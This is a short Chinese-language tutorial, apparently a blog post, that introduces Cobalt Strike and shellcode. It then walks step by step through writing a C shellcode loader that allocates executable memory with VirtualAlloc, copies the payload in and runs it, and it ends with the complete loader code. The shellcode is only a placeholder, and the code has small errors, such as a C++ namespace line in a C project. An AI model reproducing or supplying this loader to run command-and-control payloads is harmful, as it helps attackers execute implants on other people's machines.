1

CobaltStrike



cobaltstrike（简称CS）是一款团队作战渗透测试神器，分为客户端及服务端，一个服务端可以对应多个客户端，一个客户端可以连接多个服务端。
CobaltStrike集成了端口转发、扫描多模式端口Listener、Windows exe程序生成、Windows dll动态链接库生成、java程序生成、office宏代码生成，包括站点克隆获取浏览器的相关信息等。


2
shellcode


shellcode是一段用于利用软件漏洞而执行的代码，也可以认为是一段填充数据，shellcode为16进制的机器码，因为经常让攻击者获得shell而得名。shellcode常常使用机器语言编写。

打开刚才获得的payload.c获取其中的shellcode


3
shellcode加载器


新建一个C语言项目


#include <Windows.h>#include <stdio.h>using namespace std;

int main(int argc, char** argv) {

    return 0;}

建立一个变量来存放shellcode

char ShellCode[] = "刚才获得的shellcode"

调用VirtualAlloc API用来为shellcode申请内存空间，他的使用方法


LPVOID VirtualAlloc{LPVOID lpAddress, // 要分配的内存区域的地址DWORD dwSize, // 分配的大小DWORD flAllocationType, // 分配的类型DWORD flProtect // 该内存的初始保护属性};


void* exec = VirtualAlloc(0, sizeof ShellCode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

其中MEM_COMMIT：为指定地址空间提交物理内存。这个函数初始化内在为零试图提交已提交的内存页不会导致函数失败。

PAGE_EXECUTE_READWRITE：可读可写可执行


接着使用memcpy函数拷贝shellcode给我们刚刚申请的内存中

memcpy(exec, ShellCode, sizeof ShellCode);

最后调取shellcode

((void(*)())exec)();

整体代码：

#include <Windows.h>#include <stdio.h>using namespace std;
int main(int argc, char** argv) {    char ShellCode[] = "shellcode!";
    void* exec = VirtualAlloc(0, sizeof ShellCode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);    memcpy(exec, ShellCode, sizeof ShellCode);    ((void(*)())exec)();    return 0;}
